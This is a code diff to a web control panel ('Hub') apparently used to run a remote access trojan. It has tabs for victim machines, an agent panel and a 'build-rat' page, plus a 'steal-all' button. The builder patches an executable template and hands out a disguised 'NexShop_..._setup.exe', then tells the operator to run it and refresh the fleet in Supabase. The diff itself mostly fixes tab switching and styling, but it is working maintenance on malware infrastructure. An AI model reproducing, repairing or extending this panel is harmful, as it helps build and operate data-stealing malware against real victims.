@@ -22,7 +22,7 @@
 }
 *{margin:0;padding:0;box-sizing:border-box;}
 html,body{height:100%;}
-body{font-family:'Inter',system-ui,sans-serif;background:var(--bg-base);color:var(--text-main);-webkit-font-smoothing:antialiased;overflow:hidden;}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg-base);color:var(--text-main);-webkit-font-smoothing:antialiased;overflow:auto;}
 button{font-family:inherit;cursor:pointer;}
 input,select,textarea{font-family:inherit;}
 
@@ -53,8 +53,8 @@ input,select,textarea{font-family:inherit;}
 .main-title{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:var(--text-main);font-family:'JetBrains Mono',monospace;text-transform:uppercase;}
 .main-title span{font-size:16px;font-weight:400;color:var(--text-muted);}
 .content-area{padding:24px;flex:1;display:flex;flex-direction:column;gap:20px;}
-.tab{display:none;animation:fadeIn 0.15s ease;}
-.tab.active{display:block;}
+.tab{display:none !important;}
+.tab.active{display:block !important;}
 @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
 
 /* GRID & CARDS */
@@ -161,7 +161,7 @@ html,body{background:#000;}
 .btn{transition:background 0.15s,color 0.15s,border-color 0.15s,transform 0.1s,box-shadow 0.15s;}
 .btn-primary:hover{box-shadow:0 0 24px -6px rgba(228,228,231,0.35);}
 .btn-danger:hover{box-shadow:0 0 20px -8px rgba(161,161,170,0.4);}
-.tab.active{animation:fadeSlide 0.28s cubic-bezier(0.16,1,0.3,1) both;}
+.tab.active{display:block !important;animation:fadeSlide 0.28s cubic-bezier(0.16,1,0.3,1) both;}
 @keyframes fadeSlide{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:none;}}
 .steal-all-btn{position:relative;overflow:hidden;}
 .steal-all-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.08) 50%,transparent 60%);transform:translateX(-120%);transition:transform 0.6s;}
@@ -247,9 +247,9 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
 
 <nav class="sidebar">
   <div class="sidebar-title">Hub</div>
-  <button class="nav-btn active" type="button" data-tab="machines">machines</button>
-  <button class="nav-btn" type="button" data-tab="panel">agent-panel</button>
-  <button class="nav-btn" type="button" data-tab="build">build-rat</button>
+  <button class="nav-btn active" type="button" data-tab="machines" onclick="window.nexTab&&window.nexTab('machines',this)">machines</button>
+  <button class="nav-btn" type="button" data-tab="panel" onclick="window.nexTab&&window.nexTab('panel',this)">agent-panel</button>
+  <button class="nav-btn" type="button" data-tab="build" onclick="window.nexTab&&window.nexTab('build',this)">build-rat</button>
   <div style="margin-top:16px;margin-bottom:8px;display:flex;flex-direction:column;gap:4px;">
     <button class="nav-btn" type="button" id="btn-refresh" style="border:1px solid var(--border);justify-content:center;color:var(--text-main);">refresh</button>
   </div>
@@ -365,6 +365,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
 
   function toast(msg,type){
     const c=document.getElementById('toast-container');
+    if(!c){ console.log('[toast]', msg); return; }
     const t=document.createElement('div');
     t.className='toast '+(type||'success');
     t.textContent=msg; c.appendChild(t);
@@ -396,13 +397,22 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
   function agentUrl(a){return (a&&(a.panel_url||a.local_url))||'';}
 
   function tab(id,btn){
-    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-    document.querySelectorAll('.nav-btn[data-tab]').forEach(b=>b.classList.remove('active'));
-    const el=document.getElementById('tab-'+id); if(el) el.classList.add('active');
-    if(btn) btn.classList.add('active');
-    else { const b=document.querySelector('.nav-btn[data-tab="'+id+'"]'); if(b) b.classList.add('active'); }
-    document.getElementById('tab-title').textContent=({machines:'MACHINES',panel:'AGENT PANEL',build:'BUILD RAT'})[id]||id;
+    try{
+      document.querySelectorAll('.tab').forEach(function(el){ el.classList.remove('active'); });
+      document.querySelectorAll('.nav-btn[data-tab]').forEach(function(b){ b.classList.remove('active'); });
+      var el=document.getElementById('tab-'+id);
+      if(el) el.classList.add('active');
+      if(btn) btn.classList.add('active');
+      else {
+        var b=document.querySelector('.nav-btn[data-tab="'+id+'"]');
+        if(b) b.classList.add('active');
+      }
+      var titles={machines:'MACHINES',panel:'AGENT PANEL',build:'BUILD RAT'};
+      var tt=document.getElementById('tab-title');
+      if(tt) tt.textContent=titles[id]||id;
+    }catch(e){ console.error('tab', e); }
   }
+  window.nexTab = tab;
 
   function updateSelBanner(){
     const b=document.getElementById('sel-banner');
@@ -510,7 +520,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
     }
   }
 
-  document.querySelectorAll('.nav-btn[data-tab]').forEach(b=>b.addEventListener('click',()=>tab(b.getAttribute('data-tab'),b)));
+  document.querySelectorAll('.nav-btn[data-tab]').forEach(function(b){ b.addEventListener('click', function(ev){ ev.preventDefault(); tab(b.getAttribute('data-tab'), b); }); });
   document.getElementById('btn-logout').onclick=()=>{ sessionStorage.clear(); try{localStorage.removeItem(KEY_STORE);}catch(e){} location.replace('hub_login.html'); };
   const rf=()=>{refresh();toast('REFRESHED');};
   document.getElementById('btn-refresh').onclick=rf;
@@ -568,7 +578,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
       n+=patchOne(SB, pad(sbAnon,80));
       st.textContent='markers patched='+n+'/4 · size='+buf.length;
       if(n===0){
-        st.textContent+='\\n\\nTemplate SANS markers.\\n1) Sur Windows: python tttttt.py --embed --template\\n2) Upload le nouvel template.exe sur GitHub Release\\n3) Rebuild ici';
+        st.textContent+="\n\nTemplate SANS markers. Rebuild with: python tttttt.py --embed --template then upload template.exe";
         toast('TEMPLATE INVALIDE','error');
         btn.disabled=false; return;
       }
@@ -578,7 +588,7 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
       a.download='NexShop_'+KEY.slice(0,8)+'_setup.exe';
       a.click(); URL.revokeObjectURL(a.href);
       toast('EXE READY '+n+'/4','success');
-      st.textContent+='\\nOK download — lance l\\'exe, puis refresh fleet (Supabase)';
+      st.textContent+="\nOK download — lance lexe, puis refresh fleet (Supabase)";
     }catch(e){ st.textContent=String(e); toast('BUILD ERROR','error'); }
     btn.disabled=false;
   };
